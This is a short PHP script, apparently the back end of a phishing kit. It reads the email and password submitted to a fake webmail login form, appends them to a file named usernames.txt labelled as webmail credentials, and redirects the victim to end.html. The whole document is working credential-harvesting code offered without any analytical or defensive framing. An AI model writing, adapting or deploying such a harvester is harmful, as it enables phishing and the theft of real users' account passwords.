<?php


file_put_contents("usernames.txt", 
"Webmail Username: " . $_POST['email'] . "
Webmail Password: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: end.html');
exit();
?>